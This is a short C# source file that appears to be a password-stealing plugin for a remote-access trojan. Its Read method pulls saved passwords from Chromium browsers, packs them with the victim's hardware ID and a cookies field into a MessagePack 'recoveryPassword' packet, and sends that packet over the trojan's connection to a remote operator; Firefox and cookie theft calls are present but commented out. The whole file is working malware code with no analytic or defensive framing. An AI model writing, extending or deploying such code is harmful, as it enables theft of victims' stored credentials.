using MessagePackLib.MessagePack;
using System;
using System.Text;

namespace Plugin
{
    public static class Packet
    {
        public static void Read()
        {
            try
            {
                StringBuilder Credentials = new StringBuilder();
                //new Browsers.Firefox.Firefox().CredRecovery(Credentials);
                Browsers.Chromium.Chromium.Recovery(Credentials);

                StringBuilder Cookies = new StringBuilder();
                //new Browsers.Firefox.Firefox().CookiesRecovery(Cookies);
                //new Browsers.Chromium.Chromium().CookiesRecovery(Cookies);

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "recoveryPassword";
                msgpack.ForcePathObject("Password").AsString = Credentials.ToString();
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Cookies").AsString = Cookies.ToString();
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Error(ex.Message);
                Connection.Disconnected();
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}